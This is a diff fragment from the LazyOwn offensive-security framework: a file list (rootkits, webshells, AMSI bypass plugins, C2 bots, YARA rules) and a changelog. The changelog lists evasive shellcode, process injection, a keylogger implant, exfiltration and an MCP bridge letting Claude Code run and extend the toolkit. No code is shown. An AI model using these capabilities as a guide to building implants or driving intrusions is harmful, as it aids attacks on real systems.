modules/lazyarpspoofing.py - modules/lazybinenc.py - modules/lazybotcli.py - modules/lazybotnet.py - modules/lazycam.py - modules/lazycam2.py - modules/lazycam3.py - modules/lazycam4.py - modules/lazycloud.py - modules/lazycreate_webshell.py - modules/lazydeepseekcli_local.py - modules/lazydeepseekcli_localreport.py - modules/lazydisassebler.py - modules/lazyencoder_decoder.py - modules/lazyftpsniff.py - modules/lazygalazy.py - modules/lazygptcli.py - modules/lazygptcli2.py - modules/lazygptcli3.py - modules/lazygptcli4.py - modules/lazygptcli5.py - modules/lazygpttask.py - modules/lazygptvulns.py - modules/lazyhoneypot.py - modules/lazyhttpreverseshell.py - modules/lazyhttpsniff.py - modules/lazyk8s.py - modules/lazykeygen.py - modules/lazylfi2rce.py - modules/lazyllmchat.py - modules/lazylogpoisoning.py - modules/lazymariadb_rce_cve_2016-662.py - modules/lazymidm.py - modules/lazymitmap.py - modules/lazynetbios.py - modules/lazyntlrelayx.py - modules/lazyopenssh77enum2.py - modules/lazyown.py - modules/lazyown_bprfuzzer.py - modules/lazyown_bridge.py - modules/lazyown_metaextract0r.py - modules/lazyownclient.py - modules/lazyownerweb.py - modules/lazyownserver.py - modules/lazyphishingai.py - modules/lazyproxy.py - modules/lazypwn.py - modules/lazypwnkit.py - modules/lazypyautogui.py - modules/lazyredopgpt.py - modules/lazyreversentlmv2.py - modules/lazysearch.py - modules/lazysearch_bot.py - modules/lazyseo.py - modules/lazysmbrelay.py - modules/lazysniff.py - modules/lazysqli.py - modules/lazyssh.py - modules/lazyvsftp.py - modules/lazywerkzeug.py - modules/lesson_ingestor.py - modules/lilsplunky.py - modules/listener_manager.py - modules/llm_client.py - modules/llm_evaluator.py - modules/llm_factory.py - modules/logging_config.py - modules/mario.py - modules/mcp_agent_bridge.py - modules/memory_store.py - modules/metrics.py - modules/module_registry.py - modules/modules/colors.py - modules/moe_router.py - modules/morse.py - modules/nmap2csv.py - modules/obs_parser.py - modules/ooficesod0woodo.py - modules/operation.py - modules/payload_factory.py - modules/phishing_orchestrator.py - modules/pipeline_engine.py - modules/planner.py - modules/playbook_engine.py - modules/professional_report.py - modules/reactive_engine.py - modules/recommender.py - modules/report_generator.py - modules/resource_script.py - modules/rich_tui.py - modules/rl_trainer.py - modules/rootkit/mr.c - modules/rootkit/rootkit.c - modules/rootkit/rootkit.c.bkp.c - modules/search.py - modules/security_sanitizers.py - modules/session_rag.py - modules/session_reader.py - modules/sessions/llm_budget.json - modules/sql.py - modules/tel.py - modules/threat_model.py - modules/timeline_narrator.py - modules/tool_extractor.py - modules/toposwarm_bridge.py - modules/traffic_morpher.py - modules/ttp_coverage.py - modules/unified_dashboard.py - modules/unified_llm_client.py - modules/venator.py - modules/vuln_agent.py - modules/vuln_bot_cli.py - modules/vulnbot.py - modules/websocket_beacon.py - modules/win_rootkit/backup.c - modules/win_rootkit/win_ring3_rootkit.c - modules/world_model.py - modules/yaml_generator.py - modules/yara_scanner.py - payload.example.json - payloads/default_engagement.json - plugins/README.md - plugins/amsi_bypass.yaml - plugins/dotnet_reflection.yaml - plugins/etw_bypass.yaml - plugins/powershell_obfuscation.yaml - profiles/README.md - pyproject.toml - report.py - requirements-ml.txt - requirements.txt - scripts/activate_migrations.py - scripts/build_command_index.py - scripts/fix_migrated_classes.py - scripts/migrate_lazyown.py - sessions/README.md - skills/aci_planner.py - skills/autonomous_daemon.py - skills/autonomous_replay.py - skills/claude_md_orchestrator/bdd_agent.py - skills/claude_md_orchestrator/boy_scout.py - skills/claude_md_orchestrator/cicd_agent.py - skills/claude_md_orchestrator/config.py - skills/claude_md_orchestrator/documentation_agent.py - skills/claude_md_orchestrator/models.py - skills/claude_md_orchestrator/orchestrator.py - skills/claude_md_orchestrator/parser.py - skills/claude_md_orchestrator/reviewer_agent.py - skills/claude_md_orchestrator/sdd_agent.py - skills/claude_md_orchestrator/tdd_agent.py - skills/claude_md_orchestrator/tests/test_orchestrator.py - skills/claude_md_orchestrator/validators.py - skills/daemon_control.py - skills/heartbeat.py - skills/hermes-lazyown/claudemd_rules.py - skills/hermes-lazyown/executor.py - skills/hermes-lazyown/hermes_sync.py - skills/hermes-lazyown/mcp_server.py - skills/hermes-lazyown/output_compactor.py - skills/hive_mind.py - skills/lazyown_automapper.py - skills/lazyown_campaign.py - skills/lazyown_claudemd.py - skills/lazyown_context.py - skills/lazyown_daemon.py - skills/lazyown_facts.py - skills/lazyown_groq_agents.py - skills/lazyown_hooks.py - skills/lazyown_llm.py - skills/lazyown_mcp.py - skills/lazyown_mcp_helpers.py - skills/lazyown_objective.py - skills/lazyown_parquet_db.py - skills/lazyown_permissions.py - skills/lazyown_policy.py - skills/lazyown_session.py - skills/sessions_watcher.py - skills/swan_agent.py - skills/tests/test_autonomous_daemon.py - skills/tests/test_facts.py - skills/tests/test_harness_e2e.py - skills/tests/test_hive_mind.py - skills/tests/test_mcp_smoke.py - skills/tests/test_objectives.py - skills/tests/test_parquet_db.py - skills/toposwarm_autonomous.py - skills/unified_orchestrator.py - skills/update_knowledge.py - slack_c2_bot.py - specs.md - telegram_c2.py - telegram_hermes.py - tests/test_ci_strict.py - tests/test_cli_assign.py - tests/test_cli_command_sets.py - tests/test_collab_and_onboarding.py - tests/test_command_allowlist.py - tests/test_command_palette.py - tests/test_command_set_migration.py - tests/test_credentials_rotation.py - tests/test_csrf_policy.py - tests/test_db.py - tests/test_detection_feed.py - tests/test_engage_orchestrator.py - tests/test_engagement_command_gate.py - tests/test_fuzzy_picker.py - tests/test_html_sanitizer.py - tests/test_https_redirect.py - tests/test_improvements_spec.py - tests/test_lesson_ingestor.py - tests/test_llm_budget.py - tests/test_metrics.py - tests/test_migrate_lazyown_generator.py - tests/test_module_registry.py - tests/test_packaging.py - tests/test_payload_factory.py - tests/test_reactive_lateral_data.py - tests/test_recon_plan.py - tests/test_safe_subprocess.py - tests/test_scope_bound_auto_gate.py - tests/test_trusted_proxy.py - tests/test_tui_theme_command.py - tests/test_tui_themes.py - tests/test_unified_dashboard.py - tests/test_vuln_mitigations.py - users.json - utils.py - yara_rules/README.md - yara_rules/cobalt_strike_beacon.yar - yara_rules/credential_theft.yar - yara_rules/persistence_mechanism.yar - yara_rules/reverse_shell_payload.yar - yara_rules/webshell_detection.yar\nDeleted file(s):\n- .c2_credentials.txt - graphify-out/GRAPH_REPORT.md - graphify-out/GRAPH_REPORT_LAZYOWN.md - graphify-out/README.md - graphify-out/cost.json - graphify-out/graph.html - graphify-out/graph.json - graphify-out/graph_lazyown.json - graphify-out/manifest.json - sessions/README.md\nCreated file(s):\n- banners/Lazy.png - banners/Lazy1.png - banners/Lazy2.png - cli/commands/anti_forensics.py - cli/commands/caldera.py - cli/commands/cloud.py - cli/commands/command_and_control_migrated.py - cli/commands/containers.py - cli/commands/cred.py - cli/commands/cred_migrated.py - cli/commands/database.py - cli/commands/evasive_payload.py - cli/commands/exploit.py - cli/commands/exploit_migrated.py - cli/commands/lateral.py - cli/commands/lateral_migrated.py - cli/commands/misc_migrated.py - cli/commands/mobile_macos.py - cli/commands/module_manager.py - cli/commands/payload_generation.py - cli/commands/persist.py - cli/commands/persist_migrated.py - cli/commands/phishing_wizard.py - cli/commands/pivoting.py - cli/commands/postexp.py - cli/commands/postexp_migrated.py - cli/commands/pwn.py - cli/commands/recon_migrated.py - cli/commands/report.py - cli/commands/report_migrated.py - cli/commands/reporting.py - cli/commands/resource_scripting.py - cli/commands/scan_migrated.py - cli/commands/supply_chain.py - core/credentials.py - core/http.py - core/network.py - core/parsers.py - core/process.py - deploy/README.md - docs/api_docs.html - lazyaddons/CVE-2026-25089.yaml - lazyaddons/adcs_attacks.yaml - lazyaddons/cloud_bucket_enum.yaml - lazyaddons/cloud_enum.yaml - lazyaddons/cloud_metadata.yaml - lazyaddons/container_escape.yaml - lazyaddons/docker_enum.yaml - lazyaddons/fakesystemD.yaml - lazyaddons/gitleaks.yaml - lazyaddons/k8s_enum.yaml - lazyaddons/phantom2.yaml - lazyaddons/shadow.yaml - lazyaddons/websocket_beacon.yaml - lazyaddons/yara_scanner.yaml - lazyc2/app_factory.py - lazyc2/blueprints/__init__.py - lazyc2/blueprints/api.py - lazyc2/blueprints/auth.py - lazyc2/blueprints/operations.py - lazyc2/blueprints/phishing.py - lazyc2/extensions/__init__.py - lazyc2/extensions/decoy.py - lazyc2/extensions/short_urls.py - lazyc2/extensions/storage.py - lazyc2/extensions/users.py - lazyc2/models.py - lazyc2/state.py - modules/__init__.py - modules/adcs_attacks.py - modules/ai_exploit_chain.py - modules/auto_pivot.py - modules/autonomous_exploit_engine.py - modules/c2_messaging_base.py - modules/cloud_enum.py - modules/dashboard_engine.py - modules/db.py - modules/detection_feed.py - modules/domain_dominance.py - modules/evasion_engine.py - modules/evasive_payloads.py - modules/exploit_chain.py - modules/exploit_recommender.py - modules/lazycloud.py - modules/lazyk8s.py - modules/lesson_ingestor.py - modules/logging_config.py - modules/module_registry.py - modules/operation.py - modules/payload_factory.py - modules/phishing_orchestrator.py - modules/planner.py - modules/professional_report.py - modules/resource_script.py - modules/rich_tui.py - modules/traffic_morpher.py - modules/ttp_coverage.py - modules/unified_dashboard.py - modules/unified_llm_client.py - modules/websocket_beacon.py - modules/yara_scanner.py - plugins/amsi_bypass.yaml - plugins/dotnet_reflection.yaml - plugins/etw_bypass.yaml - plugins/powershell_obfuscation.yaml - profiles/README.md - scripts/activate_migrations.py - scripts/fix_migrated_classes.py - scripts/migrate_lazyown.py - skills/tests/test_mcp_smoke.py - tests/test_db.py - tests/test_detection_feed.py - tests/test_engagement_command_gate.py - tests/test_lesson_ingestor.py - tests/test_migrate_lazyown_generator.py - tests/test_module_registry.py - tests/test_payload_factory.py - tests/test_reactive_lateral_data.py - tests/test_scope_bound_auto_gate.py - tests/test_unified_dashboard.py - yara_rules/README.md - yara_rules/cobalt_strike_beacon.yar - yara_rules/credential_theft.yar - yara_rules/persistence_mechanism.yar - yara_rules/reverse_shell_payload.yar - yara_rules/webshell_detection.yar\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: mié 29 jul 2026 21:29:08 -04 \n\n Hora: 1785374948
 
-- lazyaddons
 
-## [0.2.129] — dom 17 may 2026
+### Otros
 
-### Added
+### Otros
 
-- new exploit
+  *   * unified dashboard, and some love
 
-## [0.2.128] — dom 17 may 2026
 
-### Added
+### Otros
 
-- new orquestator
+### Otros
 
-## [0.2.127] — dom 17 may 2026
+  *   * Merge branch 'main' into feature/operator-ux-boost
 
-### Changed
 
-- pipeline
+### Otros
 
-## [0.2.126] — sáb 16 may 2026
+### Otros
 
-### Security
+  *   * steel migrating the monolithic
 
-- fix(security bug fixing in lazybrp): with love
 
-## [0.2.125] — sáb 16 may 2026
+### Otros
 
-### Security
+### Otros
 
-- security issues fixed
+  *   * some bug fixing
 
-## [0.2.124] — sáb 16 may 2026
 
-### Security
+### Otros
 
-- security fixes
+### Otros
 
-## [0.2.123] — sáb 16 may 2026
+  *   * Merge pull request #201 from grisuno/dependabot/pip/tqdm-4.69.1
 
-### Fixed
 
-- bug fixing
+### Otros
 
-## [0.2.122] — sáb 16 may 2026
+### Otros
 
-### Security
+  *   * Merge pull request #202 from grisuno/dependabot/pip/argcomplete-3.7.0
 
-- new features and security updates
 
-## [0.2.120] — vie 15 may 2026
+### Otros
 
-### Changed
+### Otros
 
-- update CLAUDE.md with session learnings
+  *   * Merge pull request #203 from grisuno/dependabot/pip/pyelftools-0.33
 
-## [0.2.119] — vie 15 may 2026
 
-### Added
+### Otros
 
-- add README to every project directory
+### Otros
 
-## [0.2.118] — vie 15 may 2026
+  *   * Merge pull request #204 from grisuno/dependabot/pip/cffi-2.1.0
 
-### Changed
 
-- CLAUDE.md update with beacon family, collab, and onboarding
-- gap2 team server UI and gap3 onboarding quickstart
+### Otros
 
-## [0.2.117] — vie 15 may 2026
+### Otros
 
-### Added
+  *   * Merge pull request #205 from grisuno/dependabot/pip/pyarrow-25.0.0
 
-- blacksandbeacon Linux BOF addon
 
-## [0.2.116] — jue 14 may 2026
+### Otros
 
-### Changed
+### Otros
 
-- some wizzards and some suggester
+  *   * good by monolothic :D
 
-## [0.2.115] — jue 14 may 2026
 
-### Changed
+### Otros
 
-- recomended commands and some love
+### Otros
 
-## [0.2.114] — mié 13 may 2026
+  *   * chore(deps): bump pyarrow from 24.0.0 to 25.0.0
 
-### Changed
 
-- some playbooks
+### Otros
 
-## [0.2.113] — mié 13 may 2026
+### Otros
 
-### Added
+  *   * chore(deps): bump cffi from 2.0.0 to 2.1.0
 
-- new feature sandbox dockerized run and some other love
 
-## [0.2.112] — mar 12 may 2026
+### Otros
 
-### Added
+### Otros
 
-- feature(features news): with love
+  *   * chore(deps): bump pyelftools from 0.32 to 0.33
 
-## [0.2.111] — mar 12 may 2026
 
-### Added
+### Otros
 
-- new wizard and some refactor in LazyAddons
+### Otros
 
-## [0.2.110] — lun 11 may 2026
+  *   * chore(deps): bump argcomplete from 3.6.3 to 3.7.0
 
-### Changed
 
-- some improvements in autonomous loop
+### Otros
 
-## [0.2.109] — lun 11 may 2026
+### Otros
 
-### Changed
+  *   * chore(deps): bump tqdm from 4.67.3 to 4.69.1
 
-- dashboards
 
-## [0.2.107] — lun 11 may 2026
+### Otros
 
-### Added
+### Otros
 
-- feature(fuzzy tab): with love
+  *   * auto_pwn
 
-### Fixed
 
-- refactor(alto refactor con nuevo configurador, eliminacion de bugfixing de linter, nuevo prompt configurable): co namor para la comunidad
+### Otros
 
-## [0.2.105] — dom 10 may 2026
+### Otros
 
-### Changed
+  *   * new dashboard topoloogy and exploit suggester
 
-- some love
 
-## [0.2.104] — sáb 09 may 2026
+### Otros
 
-### Changed
+### Otros
 
-- refactor to mcp
-- some patchs
+  *   * some leetcode, better lining, refactoring, etc
 
-## [0.2.102] — sáb 09 may 2026
 
-### Changed
+### Otros
 
-- readme updates
+### Otros
 
-## [0.2.101] — sáb 09 may 2026
+  *   * leetcode
 
-### Added
 
-- new features, and readme update
-- Add files via upload
+### Otros
 
-### Changed
+### Otros
 
-- reasdme updates
+  *   * new command chain :D
 
-## [0.2.100] — jue 07 may 2026
 
-### Changed
+### Otros
 
-- some love to autocomplete commands
+### Otros
 
-## [0.2.99] — jue 07 may 2026
+  *   * new command hunt :D
 
-### Changed
 
-- assign command with tabs
+### Otros
 
-## [0.2.97] — mié 06 may 2026
+### Otros
 
-### Changed
+  *   * now we got YARA Rules :D
 
-- corrige DEPLOY.sh para GPG opcional, gh releases y orden de variables
-- Update README.md
 
-### Security
+### Otros
 
-- Merge pull request #139 from grisuno/feature/lazyc2-security-plan
+### Otros
 
-### Fixed
+  *   * now we got YARA Rules :D
 
-- some bug fixing and refactors
-- new features llm new bug fixing and new refactoring
 
-## [0.2.95]
+### Otros
 
-### Security
+### Otros
 
-- a new way to search vulns in the context of mcp
+  *   * 1. Dynamic Shellcode Patching — modules/payload_factory.py - DynamicShellcodePayload: nueva clase que genera shellcode desde cero, sin templates estáticos - linux/x64/shellcode_reverse_tcp: shellcode nativo null-free (~104 bytes) generado al vuelo con XOR dinámico para cualquier IP/puerto. Cero dependencia de msfvenom - _patch_shellcode_x64(): reemplaza placeholders \x01..\x08 y \x42\x42\x42\x42 en el template Windows x64 con IP/puerto reales - ShellcodePayload ahora acepta patcher para inyectar LHOST/LPORT automáticamente 2. DB Migration System — modules/db.py - MIGRATIONS: lista de migraciones incrementales (v2: índices, v3: columna cracked_at en creds, v4: índices en loot/notes/vulns) - _run_migrations(): aplica migraciones pendientes al iniciar, idempotente - migration_status(): expone {current, latest, pending} para diagnóstico 3. MCP Dispatch Table — skills/lazyown_mcp.py - _TOOL_HANDLERS dict + register_handler decorator: O(1) dispatch en vez de O(n) if/elif - 5 handlers migrados como ejemplo (get_config, get_llm_budget, set_config, list_modules, run_command) - Fallback automático al elif chain para handlers no migrados — cero riesgo de regresión - _dispatch_perm_check(): permission gate unificado para handlers registrados 4. Startup JSON Schema Validation — lazyown.py - Al cargar payload.json, se ejecuta load_and_validate() del schema existente en core/payload_schema.py - Errores (required fields faltantes) van a stderr con [payload] ERROR: - Warnings (tipos incorrectos) van a stderr con [payload] WARNING: - Envuelto en try/except — nunca crashea el startup
 
-## [0.2.94]
 
-### Changed
+### Otros
 
-- ReactiveSelector → pattern-matched decisions (AV/EDR, privesc hints, creds)
+### Otros
 
-## [0.2.93]
+  *   * Merge pull request #200 from grisuno/dependabot/pip/setuptools-83.0.0
 
-### Changed
 
-- hive command now from cli now
+### Otros
 
-## [0.2.92]
+### Otros
 
-### Changed
+  *   * chore(deps): bump setuptools from 81.0.0 to 83.0.0
 
-- some improves in the cicle
 
-## [0.2.91]
+### Otros
 
-### Changed
+### Otros
 
-- autonomous lop is closed now
+  *   * Merge pull request #199 from grisuno/dependabot/pip/pyasn1-0.6.4
 
-## [0.2.89]
 
-### Changed
+### Otros
 
-- some ideas from openclaw
+### Otros
 
-### Security
+  *   * modules/lazycloud.py — Cloud Attack Module (AWS, Azure, GCP), modules/lazyk8s.py — Container & Kubernetes Attack Module, and some bg fixing
 
-- Add Codacy security scan workflow
 
-## [0.2.86]
+### Otros
 
-### Changed
+### Otros
 
-- test
+  *   * chore(deps): bump pyasn1 from 0.6.3 to 0.6.4
 
-## [0.2.84]
 
-### Changed
+### Otros
 
-- some love
+### Otros
 
-## [0.2.83]
+  *   * Merge pull request #198 from grisuno/dependabot/pip/pillow-12.3.0
 
-### Changed
 
-- test
+### Otros
 
-## [0.2.82]
+### Otros
 
-### Changed
+  *   * chore(deps): bump pillow from 12.2.0 to 12.3.0
 
-- some refactors
-- mcp
-- mcp
 
-## [0.2.81]
+### Otros
 
-### Changed
+### Otros
 
-- some improves and refactors in the lazyown env
-- algunos retoques
+  *   * security bug fixing, and much much love
 
-## [0.2.80]
 
-### Changed
+### Otros
 
-- testing deployment and up the versioning semantic
-- testing deplyment
-- lazyown finally has soul
+### Otros
 
-## [0.2.79]
+  *   * This project provides a complete, self‑contained emulation of systemd’s D‑Bus interface (org.freedesktop.systemd1) and sd_notify socket. It allows modern services that expect a full systemd environment to run without modification, even when systemd is not present (e.g., containers, lightweight VMs, or development environments).
 
-### Changed
 
-- the mcp can now anotate the succes or failure and the clasification of commands, so the sessions db can feed deeplearning models to improve or ai models
+### Otros
 
-## [0.2.78]
+### Otros
 
-### Changed
+  *   * This project provides a complete, self‑contained emulation of systemd’s D‑Bus interface (org.freedesktop.systemd1) and sd_notify socket. It allows modern services that expect a full systemd environment to run without modification, even when systemd is not present (e.g., containers, lightweight VMs, or development environments).
 
-- a little changes in mcp
 
-## [0.2.77]
+### Otros
 
-### Changed
+### Otros
 
-- some love to mcp
+  *   * Phantom2 is a stealthy implant written in C that utilizes io_uring for asynchronous I/O, encrypted command and control (C2) communication, persistence mechanisms, and a keylogger. It is intended for educational and authorized penetration testing purposes only.
 
-## [0.2.76]
 
-### Added
+### Otros
 
-- new utils into mcp
+### Otros
 
-## [0.2.75]
+  *   * Merge pull request #197 from grisuno/dependabot/pip/torch-2.13.0
 
-### Added
 
-- new readme
-- Add LazyOwn MCP integration details to README
-- new full mcp to interact with claude code with independent agents flow
-- new feature to create new features :P
-- mcp server to claude code like an apt xD now claud code can create new lazyaddons
+### Otros
 
-### Changed
+### Otros
 
-- readme
-- readme
-- Merge pull request #123 from grisuno/grisuno-patch-1
-- Update README.md
-- mcp server to claude code like an apt xD
+  *   * chore(deps): bump torch from 2.12.1 to 2.13.0
 
-## [0.2.74]
 
-### Added
+### Otros
 
-- new agent LazyOwn it's very dumb now but we work on it
+### Otros
 
-## [0.2.68]
+  *   * Merge pull request #193 from grisuno/dependabot/pip/python-engineio-4.13.3
 
-### Fixed
 
-- hotfix():
+### Otros
 
-## [0.2.67]
+### Otros
 
-### Added
+  *   * Merge pull request #194 from grisuno/dependabot/pip/triton-3.7.1
 
-- feat():
 
-### Fixed
+### Otros
 
-- hotfix(install, key) some bug fixing and testing new keys to deploy
+### Otros
 
-## [0.2.64]
+  *   * Merge pull request #192 from grisuno/dependabot/pip/cuda-bindings-13.3.1
 
-### Changed
 
-- Merge branch 'main' of https://github.com/grisuno/LazyOwn
-- Merge pull request #119 from grisuno/grisuno-patch-1
-- Update README.md
+### Otros
 
-### Fixed
+### Otros
 
-- new commands, new bofs, newbug fixing, etc
-- more love to new beacon in https://github.com/grisuno/beacon, new commands LazyAddons, some bug fixing, now you can pass more than one commands in lazycommnds of lazyaddons comma separated
+  *   * Merge pull request #191 from grisuno/dependabot/pip/nvidia-nvtx-13.3.29
 
-## [0.2.63]
 
-### Fixed
+### Otros
 
-- some love to the beacon, new bofs, bug fixing, new module of telemetry not invasive
-- more love to new beacon, a little telemetry not invasive in module tel, some bug fixing
+### Otros
 
-## [0.2.62]
+  *   * Merge pull request #195 from grisuno/dependabot/pip/certifi-2026.6.17
 
-### Added
 
-- new bofs, new commands, new loader, and much much more
-- more love to new beacon, much more bofs, new loader, new gui, new command aes_pe to encript a exe with aes, to use in LazyLoader to load for example Black Basalt Beacon
+### Otros
 
-## [0.2.61]
+### Otros
 
-### Added
+  *   * docs: add app API reference to plugins README
 
-- more love to new beacon, now with bof in memory from an url, new Windows escalate privileges with a self-made exploit, and now you can add alias with add2find and addalias, enjoy
 
-### Fixed
+### Otros
 
-- new black basalt beacon, bof coff execution in memory in windows new beacon experimental, new commands and, some bug fix
+### Otros
 
-## [0.2.60]
+  *   * test: add MCP smoke test (10 checks) + add mcp dep to pyproject.toml
 
-### Added
 
-- more love to new beacon, some love in the cli, and better gui, and some litte commands like cc beef_payload and new find instance to the beef payload
+### Otros
 
-### Fixed
+### Otros
 
-- some love in the beacon, bug fixing, better gui, and much more
+  *   * perf: defer heavy imports from module-level to __init__ time
 
-## [0.2.59]
 
-### Added
+### Otros
 
-- new gui blackbasatl, new beacon, with load_modules from memory and one module a simple rev shell, hellsgate in inyection of new black basalt beacon bbb, new alias
+### Otros
 
-## [0.2.58]
+  *   * style: auto-fix 281 ruff issues in core/ and cli/
 
-### Changed
 
-- Merge pull request #113 from grisuno/grisuno-patch-1
-- Update slack_c2_bot.py
-- Update README.md
+### Otros
 
-### Fixed
+### Otros
 
-- new bug fixing new plugins, and hellbird, log live to hellbird
-- new shellcode reverse shell custom no msfvenom, some bug fixing, fix some cve, fix bugs in lolbass commands, new test to testing implants, and the king hellbird was released
+  *   * refactor: partial wildcard -> explicit import (reverted, too many deps)
 
-## [0.2.57]
 
-### Added
+### Otros
 
-- new lolbass, new stub more stealth, new gui code name black basalt
-- new ideas, plugins lua, stubs more stealth, installers, lolbas integration, and new gui in tkinter nombre codigo black basalt o por su comando gui
+### Otros
 
-## [0.2.56]
+  *   * docs: add API reference page from openapi.yaml
 
-### Added
 
-- new stubs to windows and linux, new stub in lolbas, and some new ideas
-- new stub to more silent execution in fases, new plugins lolbird using lolbas and stub in lolbas
+### Otros
 
-### Changed
+### Otros
 
-- Update README.md
-- deleting files
-- files
+  *   * refactor: consolidate sys.path.insert patterns across modules/skills
 
-## [0.2.55]
 
-### Added
+### Otros
 
-- some new ideas auto complete in c2 commands like upload_c2 donwload_cd and issue_commad_to_c2
+### Otros
 
-### Changed
+  *   * refactor: replace from utils import * with explicit imports (66 symbols)
 
-- autocomplete in c2
 
-## [0.2.54]
+### Otros
 
-### Added
+### Otros
 
-- new injection technique in windows beacon
+  *   * chore: update secrets baseline + add profiles README
 
-### Changed
 
-- Update README.md
-- the soul of ebird3 is now in our beacon, Long Life to Early bird APC Injctn
+### Otros
 
-## [0.2.53]
+### Otros
 
-### Added
+  *   * docs: truncate README.md from 20k to 2.1k lines
 
-- new amsi bypass, exeute multiplatform shellcode from url, OverWrite Process Hollowing variant from the baecon
 
-### Changed
+### Otros
 
-- shellcode execute, amsi bypass and process hollowing varian Process Overwrite
-- Merge branch 'main' of https://github.com/grisuno/LazyOwn
-- Update README.md
+### Otros
 
-## [0.2.52]
+  *   * chore: clean creds, changelog, and coverage threshold
 
-### Added
 
-- new addons and new reports and bots, new injection technique earli bird apc in pure c call ebird3
-- new LazyAddons and some stuffs :) new github bot and reporting
+### Nuevas características
 
-### Changed
+### Otros
 
-- Update README.md
+  *   * feat(c2): extract state.py and models.py from lazyc2.py
 
-## [0.2.51]
 
-### Security
+### Nuevas características
 
-- new addons and new addon creator and new vulnbot
-- new LazyAddons and some stuffs :) new vuln bot and lazyaddons ia generated
+### Otros
 
-## [0.2.50]
+  *   * feat(cli): auto-generate 10 CommandSet files from lazyown.py via migration script
 
-### Added
 
-- some new addons
+### Otros
 
-### Changed
+### Otros
 
-- Update README.md
+  *   * chore(deps): bump certifi from 2026.4.22 to 2026.6.17
 
-### Fixed
 
-- new LazyAddons and some stuffs :) and bug fix
+### Otros
 
-## [0.2.49]
+### Otros
 
-### Added
+  *   * chore(deps): bump triton from 3.6.0 to 3.7.1
 
-- new addons
-- new LazyAddons and some stuffs :)
 
-## [0.2.48]
+### Otros
 
-### Added
+### Otros
 
-- New LazyAddons cgoblin and gomulti_loader remote code execution in LazyAddons and much much more xd
-- new LazyAddons to the family gmulti_loader and CGOblin, remote code execution from LazyAddons and much more
+  *   * chore(deps): bump python-engineio from 4.13.2 to 4.13.3
 
-## [0.2.47]
 
-### Added
+### Otros
 
-- usign gum in shell scripting and new custom loader to windows for msf payload in c and asm
+### Otros
 
-### Fixed
+  *   * chore(deps): bump cuda-bindings from 13.2.0 to 13.3.1
 
-- some bug fixing
 
-## [0.2.46]
+### Otros
 
-### Changed
+### Otros
 
-- some ideas
+  *   * chore(deps): bump nvidia-nvtx from 13.0.85 to 13.3.29
 
-### Fixed
 
-- new yamls and some fix
+### Otros
 
-## [0.2.44]
+### Otros
 
-### Added
+  *   * shadow a beacon over dns :D
 
-- new addons sphinx to documentations, etc
-- sphinx to docs, new addons, and new indeas to adversaries
-- new ideas
-- some new ideas
 
-### Changed
+### Otros
 
-- cloud support
-- Merge branch 'main' of https://github.com/grisuno/LazyOwn
-- some ideas and cloud support with stratus
-- Update README.md
-- Update .readthedocs.yaml
-- Create .readthedocs.yaml
-- Update README.md
-- Update README.md
-- Update README.md
-- some ideas
+### Otros
 
-### Fixed
+  *   * some bug fixing :D
 
-- hotfix
-- hotfix
-- bugfixing and new phishing module :D
 
-## [0.2.43]
+### Otros
 
-### Added
+### Otros
 
-- new phishing module
+  *   * add forticlient CVE-2026-25089
 
-### Fixed
 
-- bugfixing and new phishing module :D
+### Otros
 
-## [0.2.42]
+### Otros
 
-### Changed
+  *   * Security advisory some prints whit debug data :)
 
-- Merge branch 'main' of https://github.com/grisuno/LazyOwn
-- Update README.md
 
-### Fixed
+### Otros
 
-- bugfixing
-- bugfixing
-- bugfixing
-- bugfixing and certipy_ad new options
+### Otros
 
-## [0.2.41]
+  *   * Merge pull request #182 from grisuno/dependabot/pip/yagmail-0.16.0
 
-### Added
 
-- new surface attack like bloodhound and decoy malicius try to share webcam, mic and screen
+### Otros
 
-### Changed
+### Otros
 
-- Update README.md
-- decoy more agresive take snapshots of screen and video of webcam and bloodhound zip surface attack
+  *   * Merge pull request #183 from grisuno/dependabot/pip/coverage-7.15.2
 
-## [0.2.40]
 
-### Added
+### Otros
 
-- new image
-- some neww ideas
+### Otros
 
-## [0.2.39]
+  *   * Merge pull request #184 from grisuno/dependabot/pip/typing-extensions-4.16.0
 
-### Added
 
-- new cappabilities to the beacon documented at readme and some new surprices
+### Otros
 
-### Fixed
+### Otros
 
-- new beacon cappabilities documented at readme.md and some new surpices and layaddons and some bug fixing
+  *   * Merge pull request #185 from grisuno/dependabot/pip/parso-0.8.7
 
-## [0.2.38]
 
-### Added
+### Otros
 
-- new functionalities to discover in c2 and implant and exfiltration cap, portscanning, etc
-- new cappabilities to the c2 to discovered the net surface and the implant can improve a network discover, portscan the discovered hosts, search for a files and exfiltrate and others
+### Otros
 
-## [0.2.37]
+  *   * Merge pull request #186 from grisuno/dependabot/pip/lxml-6.1.1
 
-### Added
 
-- new offuscated implants go more maleable more undetectable, new command rev to automated get a revshell, cloudflare tunnel to get certified subdomain to the infra for free
-- New addons, implant ofuscated by garble, tunnel cloudflare, host_discover at C2 diagram show the entire network , implant more maleable, some new ideas to ia and rag or cag
+### Otros
 
-### Changed
+### Otros
 
-- deleting large files
+  *   * chore(deps): bump lxml from 6.1.0 to 6.1.1
 
-## [0.2.36]
 
-### Added
+### Otros
 
-- new commadn lazyownbt for blueteams, and cloudflare tunnel to c2 over inet
+### Otros
 
-### Changed
+  *   * chore(deps): bump parso from 0.8.6 to 0.8.7
 
-- lazyownbt y cloudflare_tunnel
 
-## [0.2.35]
+### Otros
 
-### Added
+### Otros
 
-- new categoried help and others things
+  *   * chore(deps): bump typing-extensions from 4.15.0 to 4.16.0
 
-### Changed
 
-- Merge pull request #90 from grisuno/grisuno-patch-1
-- Update README.md
-- commands categorized
+### Otros
 
-## [0.2.34]
+### Otros
 
-### Changed
+  *   * chore(deps): bump coverage from 7.13.5 to 7.15.2
 
-- file path traversal and some othstuff
 
-### Fixed
+### Otros
 
-- hotfix
+### Otros
 
-## [0.2.33]
+  *   * chore(deps): bump yagmail from 0.15.293 to 0.16.0
 
-### Changed
 
-- fully tty in local shell in web cli
-- Merge branch 'main' of https://github.com/grisuno/LazyOwn
-- fully tty local shell implementation in web cli
+### Otros
 
-## [0.2.32]
+### Otros
 
-### Added
+  *   * payloads refactos
 
-- new system of plugins and addons
-- new system plugins and addons and more
 
-### Changed
+### Otros
 
-- Merge branch 'main' of https://github.com/grisuno/LazyOwn
+### Otros
 
-## [0.2.31]
+  *   * more modularization of lazyown.py file
 
-### Added
 
-- new plugin system and addons system
-- new system plugins and addons
+### Otros
